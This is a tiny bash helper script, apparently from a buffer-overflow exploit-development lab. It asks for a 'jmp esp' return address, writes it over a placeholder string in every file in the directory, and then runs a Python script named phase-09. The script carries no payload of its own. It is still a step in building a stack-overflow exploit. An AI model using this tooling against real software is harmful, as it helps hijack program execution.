#!/bin/bash
read -p 'Enter jmp esp address, example: \x04\x03\x02\x01 : ' jesp
grep -rl 'tttttttttt' ./ |xargs sed -i "s/tttttttttt/$jesp/g"
python phase-09-*
